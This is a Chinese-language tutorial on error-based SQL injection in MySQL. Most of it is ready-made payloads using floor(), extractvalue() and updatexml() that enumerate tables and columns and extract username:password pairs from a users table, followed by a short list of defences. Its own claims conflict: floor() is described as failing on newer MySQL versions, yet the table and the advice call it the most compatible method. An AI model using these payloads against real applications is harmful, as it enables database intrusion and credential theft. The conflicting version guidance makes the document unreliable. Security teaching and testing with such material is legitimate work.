# SQL 报错注入详解

## 什么是报错注入

报错注入（Error-based SQL Injection）是一种利用数据库错误信息来获取数据的 SQL 注入技术。当应用程序没有正确处理数据库错误时，攻击者可以通过构造特殊的 SQL 语句，使数据库返回错误信息，这些错误信息中可能包含敏感数据。

## 主要报错注入方法

### 1. 基于 floor() 的报错注入

利用 `floor(rand(0)*2)` 配合 `count()` 和 `group by` 触发主键重复错误。当使用 `rand()` 函数时，每次查询都会产生不同的随机数，而 `group by` 需要确定的值，这就导致了主键冲突。

**版本和配置影响**

**MySQL 版本影响**

> MySQL 5.7.5 以下版本：floor() 报错注入通常有效
>
> MySQL 5.7.5 及以上版本：由于 rand() 函数改进，可能不会触发错误
>
> MySQL 8.0：完全重构了随机数生成器，floor() 报错注入基本失效

**配置影响**

```sql
# 查看当前 sql_mode 设置
select @@sql_mode;

# 查看是否启用了严格模式
show variables like 'sql_mode';
```
如果启用了 `STRICT_TRANS_TABLES` 或 `STRICT_ALL_TABLES`，可能影响错误触发

某些安全配置可能限制错误信息显示

**替代方案**

```sql
# 如果 floor() 方法失效，可以尝试其他报错注入方法

# 使用 extractvalue()
and extractvalue(1,concat(0x7e,(select user()),0x7e))

# 使用 updatexml()
and updatexml(1,concat(0x7e,(select user()),0x7e),1)

# 使用 exp()
and exp(~(select * from (select user())a))
```

**更可靠的示例**

```sql
# 方法1：使用 information_schema.tables 表（数据量较大）
and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)

# 方法2：使用 union 和子查询
and (select count(*) from (select 1 union select null union select !1)x group by concat(version(),floor(rand(0)*2)))

# 方法3：使用多表连接
and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables a,information_schema.tables b group by x)c)

# 方法4：使用 having 子句
and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x having count(*)>1)a)
```

> 适用于 MySQL 5.7.5 以下版本
>
> 可以获取任意数据
>
> 构造相对复杂
>
> 需要足够的数据量才能触发错误
>
> 受 MySQL 版本和配置影响较大

### 2. 基于 extractvalue() 的报错注入

`extractvalue()` 是 MySQL 的 XML 处理函数，用于从 XML 字符串中提取值。当 XML 格式不正确时，会返回错误信息，我们可以利用这个特性来获取数据。

```sql
and extractvalue(1,concat(0x7e,(select user()),0x7e))
```

> 构造简单
>
> 返回数据长度有限制（最多32个字符）
>
> 适用于 MySQL 5.1.5 及以上版本

**处理超过32个字符的方法**

1. **使用 substr() 函数分段获取**
```sql
# 获取前32个字符
and extractvalue(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,32),0x7e))

# 获取接下来的32个字符
and extractvalue(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),33,32),0x7e))

# 获取最后的部分
and extractvalue(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),65,32),0x7e))
```

2. **使用 mid() 函数分段获取**
```sql
# 获取前32个字符
and updatexml(1,concat(0x7e,mid((select group_concat(column_name) from information_schema.columns where table_name='users'),1,32),0x7e),1)

# 获取接下来的32个字符
and updatexml(1,concat(0x7e,mid((select group_concat(column_name) from information_schema.columns where table_name='users'),33,32),0x7e),1)
```

3. **使用 limit 分页获取**
```sql
# 获取第一行数据
and extractvalue(1,concat(0x7e,(select concat(username,':',password) from users limit 0,1),0x7e))

# 获取第二行数据
and extractvalue(1,concat(0x7e,(select concat(username,':',password) from users limit 1,1),0x7e))
```

4. **使用 concat_ws() 函数处理长数据**
```sql
# 使用分隔符连接数据，便于分段获取
and updatexml(1,concat(0x7e,(select concat_ws('|',id,username,password) from users limit 0,1),0x7e),1)
```

5. **使用 hex() 函数处理二进制数据**
```sql
# 将二进制数据转换为十六进制，避免特殊字符问题
and extractvalue(1,concat(0x7e,hex((select password from users limit 0,1)),0x7e))
```

6. **使用 group_concat() 配合 substr()**
```sql
# 获取所有表名，每32个字符一段
and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,32),0x7e),1)
```

7. **使用 case when 条件判断**
```sql
# 通过条件判断逐个字符获取
and updatexml(1,concat(0x7e,(select case when substr(password,1,1)='a' then 'a' else 'b' end from users limit 0,1),0x7e),1)
```

8. **使用 if() 函数配合 substr()**
```sql
# 判断特定位置的字符
and extractvalue(1,concat(0x7e,(select if(substr(password,1,1)='a','yes','no') from users limit 0,1),0x7e))
```

使用 substr() 函数分段获取

> 使用 mid() 函数分段获取
>
> 使用 limit 分页获取
>
> 使用 concat_ws() 函数处理长数据
>
> 使用 hex() 函数处理二进制数据
>
> 使用 group_concat() 配合 substr()
>
> 使用 case when 条件判断
>
> 使用 if() 函数配合 substr()

这些方法各有特点：

> 前两种方法适合获取连续的长文本
>
> 第三种方法适合获取多行数据
>
> 第四种方法适合处理结构化数据
>
> 第五种方法适合处理二进制数据
>
> 最后三种方法适合精确获取特定字符

### 3. 基于 updatexml() 的报错注入

`updatexml()` 也是 MySQL 的 XML 处理函数，用于更新 XML 文档。当 XML 格式不正确时，同样会返回错误信息。

```sql
and updatexml(1,concat(0x7e,(select user()),0x7e),1)
```

> 构造简单
>
> 返回数据长度有限制（最多32个字符）
>
> 适用于 MySQL 5.1.5 及以上版本

## 其他报错注入方法

除了上述三种主要方法外，还有其他一些报错注入方法：

1. 基于 exp() 的报错注入
2. 基于 bigint 溢出的报错注入
3. 基于 geometrycollection() 的报错注入
4. 基于 multipoint() 的报错注入
5. 基于 polygon() 的报错注入
6. 基于 multipolygon() 的报错注入
7. 基于 linestring() 的报错注入
8. 基于 multilinestring() 的报错注入
9. 基于 name_const() 的报错注入

## MySQL 版本兼容性对比

| 报错注入方法 | MySQL 5.0 | MySQL 5.1 | MySQL 5.5 | MySQL 5.6 | MySQL 5.7 | MySQL 8.0 |
|------------|----------|----------|----------|----------|----------|----------|
| floor()    | ✓        | ✓        | ✓        | ✓        | ✓        | ✗       |
| extractvalue() | ✗   | ✓        | ✓        | ✓        | ✓        | ✓        |
| updatexml() | ✗      | ✓        | ✓        | ✓        | ✓        | ✓        |
| exp()      | ✗        | ✗        | ✓        | ✓        | ✓        | ✓        |
| bigint     | ✓        | ✓        | ✓        | ✓        | ✓        | ✓        |
| geometry   | ✓        | ✓        | ✓        | ✓        | ✓        | ✓      |
| name_const | ✓        | ✓        | ✓        | ✓        | ✓        | ✗        |

## 使用建议

1. 优先使用 floor() 方法，因为它的兼容性最好
2. 如果 floor() 方法失败，可以尝试 extractvalue() 或 updatexml()
3. 注意不同版本 MySQL 对某些方法的限制
4. 在实际测试中，建议先确定数据库版本，再选择合适的报错注入方法

## 防御建议

1. 关闭错误信息显示
2. 使用参数化查询
3. 对用户输入进行严格的过滤和验证
4. 使用最小权限原则
5. 定期更新数据库版本 